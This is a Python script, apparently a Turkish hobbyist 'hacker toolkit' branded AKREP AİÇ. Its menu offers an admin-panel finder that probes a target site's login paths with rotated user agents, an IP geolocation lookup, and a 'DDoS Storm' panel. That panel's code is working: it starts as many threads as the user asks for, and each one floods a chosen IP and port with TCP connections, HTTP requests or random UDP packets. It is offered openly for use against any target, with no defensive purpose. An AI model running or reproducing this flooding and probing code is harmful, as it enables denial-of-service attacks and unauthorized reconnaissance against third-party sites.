import os, sys, time, socket, random, requests, threading, webbrowser
from bs4 import BeautifulSoup

# Renk Paleti
green = "\033[1;32m"
red = "\033[1;31m"
white = "\033[1;37m"
blue = "\033[1;34m"
reset = "\033[0m"

# Simgeler
info = f"{blue}[*]{reset} "
success = f"{green}[+]{reset} "
fail = f"{red}[-]{reset} "

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
]

def clear(): os.system('clear')

def loading():
    clear()
    print(f"{green}AKREP AİÇ Sistemleri Yükleniyor...")
    for i in range(21):
        time.sleep(0.05)
        sys.stdout.write(f"\r{white}[%-20s] %d%%" % ('█' * i, i * 5))
        sys.stdout.flush()
    print(f"\n{success}Sistem Başlatıldı!{reset}")
    time.sleep(1)

def banner():
    print(f"""{green}
⣲⣶⠒⠷⠶⠤⠴⠦⠤⠤⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣴⣶⠚⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀        ⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⢌⣛⠶⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀        ⠀⠠⢚⠟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠱⡄⠙⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀       ⠀⢀⡤⠖⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣀⠀⣀⣤⣧⠔⠛⠓⠲⠤⢄⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀        ⠀⠀⢐⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣤⣄⣠⣤⣴⣾⣿⣿⣾⡗⠀⢀⣀⢤⠐⠠⠤⣉⠓⠦⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀        ⢀⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠒⠒⠶⠶⢾⣿⡿⠛⢻⣻⠛⢻⣿⣿⠟⣋⣺⣿⠏⠀⠴⠿⠹⠋⠀⠀⠀⠀⠈⠀⠨⠳⣄⠀⠀
⠀⠀⠀⠀⠀        ⠀⠀⢐⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⠤⠄⠐⢾⣿⣝⠤⣀⢀⡠⣱⣿⣿⣿⣿⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀
⠀⠀⠀⠀⠀        ⠀⢠⡂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢉⣛⣺⣿⣾⣛⣽⣿⡟⠁⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡀
⠀⠀⠀⠀        ⠀⠐⡟⠀⠀⠀⠀⡠⠖⠀⠀⠀⢀⡴⠃⠀⠀⠀⠀⠀⠀⡈⠉⢉⡽⠿⢛⡿⢛⠯⠭⣒⣚⣩⣭⣭⣤⡤⠭⠭⢭⣥⣀⣉⣑⣒⢵⡀⠀⠀⢸⡇
⠀⠀⠀⠀        ⠀⣰⠃⠀⢀⡔⠋⠀⠀⠀⣠⡴⠋⠀⠀⠀⠀⣠⣤⡴⠋⠀⠀⠀⠀⠀⠾⢶⣾⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠳⡀⠀⣸⠃
⠀⠀⠀        ⠀⢰⠟⢀⣴⠏⠀⡀⢀⣴⡿⠋⠀⠀⠀⢀⡴⠟⠋⠁⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣇⠔⠁⠀
⠀⠀⠀        ⠀⣞⣴⣿⠃⢠⣾⣴⣿⠋⠀⠀⠀⠀⠐⠋⠀⠀⠀⠀⠀⢐⣚⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠁⠀⠀⠀
⠀⠀        ⠀⣸⣿⣿⣧⣶⣿⣿⣿⠗⠁⠀⡠⠂⠀⢀⠀⠀⠀⠀⠂⢉⣭⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⡟⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀        ⢀⠼⢻⣿⣿⣿⣿⣿⣿⠁⢀⣴⠏⢀⣠⠞⠁⢀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠱⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀        ⠀⣠⣿⣿⣿⣿⣿⣿⣧⣾⡿⣡⣾⣿⠃⣠⡾⠁⠀⣀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠂⠀⢻⣍⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀        ⠈⣽⣿⣿⣿⣿⣿⣿⡟⠉⣰⣿⡿⣡⣾⣿⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⢻⣶⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀        ⣠⣿⣿⣿⣿⣿⣿⣿⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⣱⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⢸⣾⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠐⠛⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢫⣿⠏⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣼⡄⠀⣿⣿⡏⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀        ⠀⣾⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣴⡿⢋⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀        ⠀⠁⠀⡿⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀       ⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀        ⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀        ⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⠿⢿⣿⣿⣿⣿⣿⣿⣿⢿⡿⠁⣿⠏⠘⢿⣿⣿⣿⠋⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀        ⠀⠀⠀⠿⠋⣿⡿⠋⣸⠟⠁⠀⣾⣿⣿⣿⣿⣿⠟⠁⠈⠀⠀⠹⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀        ⠀⠀⠀⠀⠁⠀⠀⠉⠀⠀⠰⠿⣿⣿⠿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀        ⠀⠀⠀⠀⠀⠀⠀⠙⡏⠀⠻⠀

          {white}AYDINLIK İÇİN ÇALIŞANLAR
           Made by AKREP AİÇ
          {blue}GitHub: https://github.com/dixblo-q
          İnstagram: @dixblowashere
          Discord: @tukenecegizz{reset}
    """)

# --- FONKSİYONLAR ---

def admin_finder():
    site = input(f"\n{info}Target Site [https://site.com]: ").strip()
    if not site.startswith('http'): site = 'http://' + site
    paths = ['/admin/','/login.php','/wp-admin/','/admin/login.php','/panel/']
    for p in paths:
        url = site + p
        try:
            r = requests.get(url, timeout=3, headers={'User-Agent': random.choice(user_agents)})
            if r.status_code == 200: print(f"{success}Found: {url}")
        except: pass

def ddos_panel():
    clear(); banner()
    print(f"{red}--- AKREP-STORM DDoS PANEL ---{reset}")
    print(f"1- HTTP  2- TCP  3- UDP\n4- ICMP  5- DNS  6- SYN")
    choice = input("\nMethod > ")
    target = input("Target IP/Domain: ").strip()
    try: ip = socket.gethostbyname(target)
    except: print(fail+"Address Error"); return
    port = int(input("Port: "))
    threads = int(input("Threads: "))

    def flood():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if choice in "345" else socket.SOCK_STREAM)
                if choice in "126": s.connect((ip, port))
                if choice == "1": s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())
                else: s.send(random._urandom(1024))
            except: pass

    print(f"{success}Attack Started on {ip}...")
    for _ in range(threads): threading.Thread(target=flood, daemon=True).start()
    input(f"\n{red}Press Enter to stop...{reset}")

def ip_geo():
    ip = input(f"\n{info}Target IP: ")
    try:
        data = requests.get(f"http://ip-api.com/json/{ip}").json()
        for k,v in data.items(): print(f"{green}{k}: {white}{v}")
    except: print(fail+"Error")

def main():
    loading()
    while True:
        clear(); banner()
        print(f"""
{green}01-{reset} Admin Finder     {green}06-{reset} Shell Checker
{green}02-{reset} Admin Bypass     {green}07-{reset} Dork Search
{green}03-{reset} IP Geolocation   {green}08-{reset} Reverse IP
{green}04-{reset} DDoS Storm       {green}09-{reset} Vuln Scanner
{green}05-{reset} Site Info        {green}10-{reset} Hash Cracker

{blue}11-{reset} Telegram 🔱      {red}00-{reset} Exit
        """)
        cmd = input(f"{white}Akrep > {reset}")
        if cmd == "1": admin_finder(); input("\nDone.")
        elif cmd == "4": ddos_panel()
        elif cmd == "3": ip_geo(); input("\nDone.")
        elif cmd == "11": webbrowser.open("https://t.me/a3kr4p"); os.system("termux-open-url https://t.me/a3kr4p")
        elif cmd == "00": sys.exit()

if __name__ == "__main__": main()
